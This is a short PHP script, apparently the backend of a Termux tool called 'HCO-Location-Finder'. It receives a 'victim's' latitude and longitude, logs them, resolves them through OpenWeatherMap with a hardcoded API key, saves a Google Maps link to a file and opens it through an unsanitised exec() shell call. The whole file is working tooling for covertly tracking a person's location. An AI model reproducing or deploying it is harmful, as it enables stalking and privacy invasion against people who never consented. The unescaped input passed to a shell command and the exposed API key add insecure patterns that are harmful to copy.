<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $lati = $_POST['lati'];
    $longi = $_POST['longi'];

    // Terminal pe latitude longitude print karenge
    file_put_contents('php://stdout', "\n\n Victim Information :- \nLatitude: $lati, Longitude: $longi\n\n");

    $apiKey = "5263f75a4e738f5b297b1b5ca639cc1c"; // Apna OpenWeatherMap API key
    $url = "https://api.openweathermap.org/data/2.5/weather?lat=$lati&lon=$longi&units=metric&appid=$apiKey";


    $response = file_get_contents($url);

// JSON decode
    $data = json_decode($response, true);
    
    // Latitude and Longitude nikaal lo
    $lati = $data['coord']['lat'];
    $longi = $data['coord']['lon'];
    
    $maps_url = "https://www.google.com/maps/search/?api=1&query=$lati,$longi";
    // File me save karo
    $output = "Latitude: $lati\nLongitude: $longi\nLink:- $maps_url";
    file_put_contents("/data/data/com.termux/files/home/HCO-Location-Finder/location.txt", $output);
    
    // Confirmation
    //echo "Latitude & Longitude saved in location.txt";
    
    //file_put_contents("location.txt", $response);
    echo $output;

    // Google Maps open karo (Termux ka default browser ya Chrome)
    exec("termux-open-url '$maps_url'");

    exit;
}
?>
